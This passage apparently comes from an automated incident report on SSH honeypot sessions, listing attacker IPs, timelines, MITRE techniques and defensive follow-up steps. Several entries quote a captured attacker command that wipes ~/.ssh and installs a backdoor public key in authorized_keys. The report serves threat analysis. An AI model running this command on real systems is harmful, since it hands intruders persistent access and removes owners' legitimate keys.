| `2026-04-12 21:40:13` | `cowrie.log.closed` |
| `2026-04-12 21:40:13` | `cowrie.session.params` |
| `2026-04-12 21:40:13` | `cowrie.command.input` |
| `2026-04-12 21:40:14` | `cowrie.log.closed` |
| `2026-04-12 21:40:14` | `cowrie.session.params` |
| `2026-04-12 21:40:14` | `cowrie.command.input` |
| `2026-04-12 21:40:14` | `cowrie.log.closed` |
| `2026-04-12 21:40:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.42[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.48.42[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b68deb0219a9

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]16` |
| **First Seen** | 2026-04-12 21:41 |
| **Last Seen** | 2026-04-12 21:42 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:41:55` | `cowrie.session.connect` |
| `2026-04-12 21:41:55` | `cowrie.client.version` |
| `2026-04-12 21:41:58` | `cowrie.client.kex` |
| `2026-04-12 21:41:59` | `cowrie.login.success` |
| `2026-04-12 21:42:02` | `cowrie.session.params` |
| `2026-04-12 21:42:02` | `cowrie.command.input` |
| `2026-04-12 21:42:02` | `cowrie.command.failed` |
| `2026-04-12 21:42:02` | `cowrie.log.closed` |
| `2026-04-12 21:42:02` | `cowrie.session.params` |
| `2026-04-12 21:42:02` | `cowrie.command.input` |
| `2026-04-12 21:42:03` | `cowrie.session.file_download` |
| `2026-04-12 21:42:03` | `cowrie.log.closed` |
| `2026-04-12 21:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]16` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-573d26f1910e

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]16` |
| **First Seen** | 2026-04-12 21:42 |
| **Last Seen** | 2026-04-12 21:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:42:11` | `cowrie.session.connect` |
| `2026-04-12 21:42:11` | `cowrie.client.version` |
| `2026-04-12 21:42:11` | `cowrie.client.kex` |
| `2026-04-12 21:42:12` | `cowrie.login.success` |
| `2026-04-12 21:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]16` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2f7767a7c84

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 21:46 |
| **Last Seen** | 2026-04-12 21:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:46:05` | `cowrie.session.connect` |
| `2026-04-12 21:46:05` | `cowrie.client.version` |
| `2026-04-12 21:46:05` | `cowrie.client.kex` |
| `2026-04-12 21:46:06` | `cowrie.login.success` |
| `2026-04-12 21:46:06` | `cowrie.session.params` |
| `2026-04-12 21:46:06` | `cowrie.command.input` |
| `2026-04-12 21:46:06` | `cowrie.command.failed` |
| `2026-04-12 21:46:06` | `cowrie.log.closed` |
| `2026-04-12 21:46:07` | `cowrie.session.params` |
| `2026-04-12 21:46:07` | `cowrie.command.input` |
| `2026-04-12 21:46:07` | `cowrie.session.file_download` |
| `2026-04-12 21:46:07` | `cowrie.log.closed` |
| `2026-04-12 21:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c4d101d8c8e

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 21:46 |
| **Last Seen** | 2026-04-12 21:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:46:09` | `cowrie.session.connect` |
| `2026-04-12 21:46:09` | `cowrie.client.version` |
| `2026-04-12 21:46:09` | `cowrie.client.kex` |
| `2026-04-12 21:46:09` | `cowrie.login.success` |
| `2026-04-12 21:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e05cf39b0c28

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 21:50 |
| **Last Seen** | 2026-04-12 21:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:50:47` | `cowrie.session.connect` |
| `2026-04-12 21:50:47` | `cowrie.client.version` |
| `2026-04-12 21:50:47` | `cowrie.client.kex` |
| `2026-04-12 21:50:47` | `cowrie.login.success` |
| `2026-04-12 21:50:48` | `cowrie.session.params` |
| `2026-04-12 21:50:48` | `cowrie.command.input` |
| `2026-04-12 21:50:48` | `cowrie.command.failed` |
| `2026-04-12 21:50:48` | `cowrie.log.closed` |
| `2026-04-12 21:50:48` | `cowrie.session.params` |
| `2026-04-12 21:50:48` | `cowrie.command.input` |
| `2026-04-12 21:50:48` | `cowrie.session.file_download` |
| `2026-04-12 21:50:48` | `cowrie.log.closed` |
| `2026-04-12 21:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57a947e9cb48

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 21:50 |
| **Last Seen** | 2026-04-12 21:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:50:50` | `cowrie.session.connect` |
| `2026-04-12 21:50:50` | `cowrie.client.version` |
| `2026-04-12 21:50:50` | `cowrie.client.kex` |
| `2026-04-12 21:50:50` | `cowrie.login.success` |
| `2026-04-12 21:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b626a60a3588

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 21:52 |
| **Last Seen** | 2026-04-12 21:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:52:23` | `cowrie.session.connect` |
| `2026-04-12 21:52:23` | `cowrie.client.version` |
| `2026-04-12 21:52:23` | `cowrie.client.kex` |
| `2026-04-12 21:52:23` | `cowrie.login.success` |
| `2026-04-12 21:52:24` | `cowrie.session.params` |
| `2026-04-12 21:52:24` | `cowrie.command.input` |
| `2026-04-12 21:52:24` | `cowrie.command.failed` |
| `2026-04-12 21:52:24` | `cowrie.log.closed` |
| `2026-04-12 21:52:24` | `cowrie.session.params` |
| `2026-04-12 21:52:24` | `cowrie.command.input` |
| `2026-04-12 21:52:24` | `cowrie.session.file_download` |
| `2026-04-12 21:52:24` | `cowrie.log.closed` |
| `2026-04-12 21:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9e30f3d383d

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 21:52 |
| **Last Seen** | 2026-04-12 21:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:52:26` | `cowrie.session.connect` |
| `2026-04-12 21:52:26` | `cowrie.client.version` |
| `2026-04-12 21:52:26` | `cowrie.client.kex` |
| `2026-04-12 21:52:26` | `cowrie.login.success` |
| `2026-04-12 21:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-600f43526022

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 21:53 |
| **Last Seen** | 2026-04-12 21:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:53:59` | `cowrie.session.connect` |
| `2026-04-12 21:53:59` | `cowrie.client.version` |
| `2026-04-12 21:53:59` | `cowrie.client.kex` |
| `2026-04-12 21:53:59` | `cowrie.login.success` |
| `2026-04-12 21:54:00` | `cowrie.session.params` |
| `2026-04-12 21:54:00` | `cowrie.command.input` |
| `2026-04-12 21:54:00` | `cowrie.command.failed` |
| `2026-04-12 21:54:00` | `cowrie.log.closed` |
| `2026-04-12 21:54:00` | `cowrie.session.params` |
| `2026-04-12 21:54:00` | `cowrie.command.input` |
| `2026-04-12 21:54:00` | `cowrie.session.file_download` |
| `2026-04-12 21:54:00` | `cowrie.log.closed` |
| `2026-04-12 21:54:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cedc5b4a56f4

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 21:54 |
| **Last Seen** | 2026-04-12 21:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:54:02` | `cowrie.session.connect` |
| `2026-04-12 21:54:02` | `cowrie.client.version` |
| `2026-04-12 21:54:02` | `cowrie.client.kex` |
| `2026-04-12 21:54:02` | `cowrie.login.success` |
| `2026-04-12 21:54:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7a8feadd65a

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 21:55 |
| **Last Seen** | 2026-04-12 21:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:55:15` | `cowrie.session.connect` |
| `2026-04-12 21:55:15` | `cowrie.client.version` |
| `2026-04-12 21:55:15` | `cowrie.client.kex` |
| `2026-04-12 21:55:16` | `cowrie.login.success` |
| `2026-04-12 21:55:16` | `cowrie.session.params` |
| `2026-04-12 21:55:16` | `cowrie.command.input` |
| `2026-04-12 21:55:16` | `cowrie.command.failed` |
| `2026-04-12 21:55:16` | `cowrie.log.closed` |
| `2026-04-12 21:55:17` | `cowrie.session.params` |
| `2026-04-12 21:55:17` | `cowrie.command.input` |
| `2026-04-12 21:55:17` | `cowrie.session.file_download` |
| `2026-04-12 21:55:17` | `cowrie.log.closed` |
| `2026-04-12 21:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38b3edda6138

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 21:55 |
| **Last Seen** | 2026-04-12 21:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:55:19` | `cowrie.session.connect` |
| `2026-04-12 21:55:19` | `cowrie.client.version` |
| `2026-04-12 21:55:19` | `cowrie.client.kex` |
| `2026-04-12 21:55:20` | `cowrie.login.success` |
| `2026-04-12 21:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4273df081f0

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 21:57 |
| **Last Seen** | 2026-04-12 21:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:57:10` | `cowrie.session.connect` |
| `2026-04-12 21:57:10` | `cowrie.client.version` |
| `2026-04-12 21:57:11` | `cowrie.client.kex` |
| `2026-04-12 21:57:11` | `cowrie.login.success` |
| `2026-04-12 21:57:12` | `cowrie.session.params` |
| `2026-04-12 21:57:12` | `cowrie.command.input` |
| `2026-04-12 21:57:12` | `cowrie.command.failed` |
| `2026-04-12 21:57:12` | `cowrie.log.closed` |
| `2026-04-12 21:57:12` | `cowrie.session.params` |
| `2026-04-12 21:57:12` | `cowrie.command.input` |
| `2026-04-12 21:57:12` | `cowrie.session.file_download` |
| `2026-04-12 21:57:12` | `cowrie.log.closed` |
| `2026-04-12 21:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e6f21ef08b1

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 21:57 |
| **Last Seen** | 2026-04-12 21:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:57:15` | `cowrie.session.connect` |
| `2026-04-12 21:57:15` | `cowrie.client.version` |
| `2026-04-12 21:57:15` | `cowrie.client.kex` |
| `2026-04-12 21:57:16` | `cowrie.login.success` |
| `2026-04-12 21:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13dd642a72a9

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 22:00 |
| **Last Seen** | 2026-04-12 22:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:00:41` | `cowrie.session.connect` |
| `2026-04-12 22:00:41` | `cowrie.client.version` |
| `2026-04-12 22:00:41` | `cowrie.client.kex` |
| `2026-04-12 22:00:41` | `cowrie.login.success` |
| `2026-04-12 22:00:41` | `cowrie.session.params` |
| `2026-04-12 22:00:41` | `cowrie.command.input` |
| `2026-04-12 22:00:41` | `cowrie.command.failed` |
| `2026-04-12 22:00:41` | `cowrie.log.closed` |
| `2026-04-12 22:00:42` | `cowrie.session.params` |
| `2026-04-12 22:00:42` | `cowrie.command.input` |
| `2026-04-12 22:00:42` | `cowrie.session.file_download` |
| `2026-04-12 22:00:42` | `cowrie.log.closed` |
| `2026-04-12 22:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfed25559be5

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 22:00 |
| **Last Seen** | 2026-04-12 22:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:00:44` | `cowrie.session.connect` |
| `2026-04-12 22:00:44` | `cowrie.client.version` |
| `2026-04-12 22:00:44` | `cowrie.client.kex` |
| `2026-04-12 22:00:44` | `cowrie.login.success` |
| `2026-04-12 22:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72e093e0ed1a

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 22:00 |
| **Last Seen** | 2026-04-12 22:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
